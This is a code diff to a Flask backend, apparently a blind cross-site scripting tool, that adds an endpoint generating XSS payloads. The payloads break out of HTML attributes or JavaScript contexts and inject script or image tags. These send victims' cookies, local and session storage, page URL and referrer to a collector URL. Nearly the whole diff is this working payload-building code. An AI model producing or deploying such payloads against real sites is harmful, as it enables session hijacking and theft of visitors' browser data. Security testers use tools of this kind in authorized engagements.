@@ -7,10 +7,91 @@ from app.models import XSS, Client
 from flask import jsonify, request
 from flask_jwt_extended import jwt_required
 
+PAYLOADS = {
+    "cookies": 'cookies="+encodeURIComponent(document.cookie)+"',
+    "local_storage": 'local_storage="+encodeURIComponent(JSON.stringify(localStorage))+"',
+    "session_storage": 'session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))+"',
+    "origin_url": 'origin_url="+encodeURIComponent(location.href)+"',
+    "referrer": 'referrer="+encodeURIComponent(document.referrer)+"',
+}
 
-@bp.route("/xss/generate", methods=["GET"])
+
+@bp.route("/xss/generate", methods=["POST"])
 @jwt_required()
 def xss_generate():
+    """Generates an XSS payload"""
+
+    data = request.get_json()
+
+    client_id = data.get("client_id", None)
+    if not client_id:
+        return jsonify({"status": "error", "detail": "Missing client_id"}), 400
+    client = Client.query.filter_by(id=data["client_id"]).first_or_404()
+
+    url = data.get("url", None)
+    if not url:
+        return jsonify({"status": "error", "detail": "Missing url"}), 400
+
+    xss_type = data.get("xss_type", None)
+    if not xss_type:
+        return jsonify({"status": "error", "detail": "Missing xss_type"}), 400
+
+    code_type = data.get("code_type", None)
+    if not code_type:
+        return jsonify({"status": "error", "detail": "Missing code_type"}), 400
+
+    to_gather = data.get("to_gather", [])
+
+    other_data = data.get("other_data", {})
+
+    if code_type == "html":
+        if "fingerprint" in to_gather or "dom" in to_gather or "screenshot" in to_gather:
+            pass
+        elif "local_storage" in to_gather or "session_storage" in to_gather or "cookies" in to_gather or "origin" in to_gather:
+            payload_start = f'\'>"><script>new Image().src="{url}/api/x/{xss_type}/{client.uid}?'
+
+            payload_other_data = "&".join({f"{k}={v}" for k, v in other_data.items()})
+            payload_to_gather = "&".join([v for k, v in PAYLOADS.items() if k in to_gather]).rstrip('+"')
+
+            payload_mid = "&".join([payload_other_data, payload_to_gather]) if payload_other_data else payload_to_gather
+            payload_end = "</script>"
+            payload = payload_start + payload_mid + payload_end
+            return (payload), 200
+        else:
+            payload_start = f'\'>"><img src="{url}/api/x/{xss_type}/{client.uid}'
+            payload_other_data = "&".join({f"{k}={v}" for k, v in other_data.items()})
+            payload_start = f"{payload_start}?{payload_other_data}" if payload_other_data else payload_start
+            payload_end = '" />'
+            payload = payload_start + payload_end
+            return (payload), 200
+
+    else:
+        if "fingerprint" in to_gather or "dom" in to_gather or "screenshot" in to_gather:
+            pass
+        else:
+            payload_start = f';}};new Image().src="{url}/api/x/{xss_type}/{client.uid}"'
+
+            payload_other_data = "&".join({f"{k}={v}" for k, v in other_data.items()})
+            payload_to_gather = "&".join([v for k, v in PAYLOADS.items() if k in to_gather]).rstrip('+"')
+
+            payload_start = f"""{payload_start.rstrip('"')}?""" if payload_other_data or payload_to_gather else payload_start
+
+            payload_mid = ""
+            if payload_other_data and payload_to_gather:
+                payload_mid = "&".join([payload_other_data, payload_to_gather])
+            elif payload_other_data:
+                payload_mid = payload_other_data
+            elif payload_to_gather:
+                payload_mid = payload_to_gather
+
+            payload_end = ";"
+            payload = payload_start + payload_mid + payload_end
+            return (payload), 200
+
+
+# @bp.route("/xss/generate", methods=["GET"])
+# @jwt_required()
+def xss_generate_old():
     """Generates an XSS payload"""
 
     parameters = request.args.to_dict()
@@ -21,6 +102,7 @@ def xss_generate():
         return jsonify({"status": "error", "detail": "Bad client ID"}), 400
 
     client = Client.query.filter_by(id=parameters["client_id"]).first_or_404()
+
     parameters.pop("client_id", None)
     uid = client.uid
     other_data = ""
